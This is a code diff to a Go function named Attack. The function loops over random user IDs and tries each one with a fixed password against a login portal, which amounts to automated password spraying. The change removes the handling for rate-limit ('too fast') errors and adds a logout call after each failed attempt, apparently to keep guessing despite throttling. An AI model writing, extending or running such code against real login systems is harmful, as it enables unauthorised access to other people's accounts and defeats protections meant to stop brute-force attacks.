@@ -1,7 +1,6 @@
 package auth
 
 import (
-	"errors"
 	"fmt"
 	"time"
 
@@ -20,13 +19,10 @@ type AttackConfig struct {
 var attackLogger = log.New("auth/attack")
 
 func Attack(cfg *AttackConfig) error {
-	tooFastCount := 0
 	tried := make(map[string]struct{})
 
 	for {
 		userid := RandomUserid()
-
-	TooFastRetry:
 
 		if cfg.Base == "" {
 			base, err := FindPortal(cfg.Host, cfg.Link)
@@ -48,19 +44,16 @@ func Attack(cfg *AttackConfig) error {
 			UserID:   userid,
 			Password: cfg.Password,
 		}); err != nil {
-			if errors.Is(err, ErrTooFast) {
-				attackLogger.Warn("too fast, try again later")
-				tooFastCount++
-				if tooFastCount > 5 {
-					continue
-				}
-				time.Sleep(time.Duration(5*(tooFastCount+1)) * time.Second)
-				goto TooFastRetry
+			attackLogger.Warn("failed to login", "error", err)
+
+			if err := Logout(&LogoutConfig{
+				Base:   cfg.Base,
+				Link:   cfg.Link,
+				UserID: userid,
+			}); err != nil {
+				return err
 			}
 
-			time.Sleep(1 * time.Second)
-			tooFastCount = 0
-			attackLogger.Warn("failed to login", "error", err)
 			continue
 		}
 
